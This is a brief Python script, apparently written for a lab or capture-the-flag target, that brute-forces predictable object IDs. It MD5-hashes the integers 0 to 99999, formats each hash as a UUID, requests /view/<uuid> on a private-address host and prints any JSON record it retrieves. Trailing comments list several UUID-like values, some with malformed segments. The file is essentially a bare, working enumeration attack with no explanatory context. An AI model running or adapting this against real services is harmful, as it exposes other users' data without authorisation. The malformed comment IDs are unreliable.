import hashlib
import json
import requests

foo = 0
while foo < 100000:
    bar = str(foo)
    md5_hash = hashlib.md5(bar.encode())
    res = md5_hash.hexdigest()
    uri = f"{res[0: 8]}-{res[8: 12]}-{res[12: 16]}-{res[16: 20]}-{res[20: ]}"
    url = f"http://10.82.156.152/view/{uri}"
    response = requests.get(url)
    if response.status_code == 200:
        print(url)
        print(json.loads(response.content))
    foo += 1

#17d8da815fa21-c57a-f982-9fb0a86960
#efe937780-e955-7425-0dab-e07151bdc2
#e8c0653f-ea13-f91b-f3c4-8159f7c24f7
#e4a6222c-db5b-3437-5400-904f03d8e6a5


#00795a8b-fb58-47c0-91be-af068ddc71b5